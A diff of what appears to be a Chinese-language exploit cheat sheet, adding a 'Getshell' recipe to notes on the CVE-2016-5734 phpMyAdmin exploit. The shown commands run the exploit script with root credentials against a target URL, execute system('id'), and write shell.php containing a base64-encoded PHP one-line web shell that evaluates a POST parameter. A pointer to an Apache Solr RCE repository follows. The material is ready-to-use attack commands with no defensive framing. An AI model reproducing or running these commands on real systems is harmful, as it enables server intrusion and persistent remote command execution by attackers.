@@ -11,6 +11,8 @@ https://www.exploit-db.com/exploits/40185
 use :
 python3 CVE-2016-5734.py -u root -p root -d test http://targetip:port/ -c "system('id');"
 注: 必須知道資料庫帳號密碼
+Getshell(Payload是base64encode，寫一句話到根目錄下):
+python3  CVE-2016-5734.py -u root -p root http://targetip:port/ -c "file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4='));"
 
 # Apache Solr
 https://github.com/c1aysec/Apache-Solr-RCE
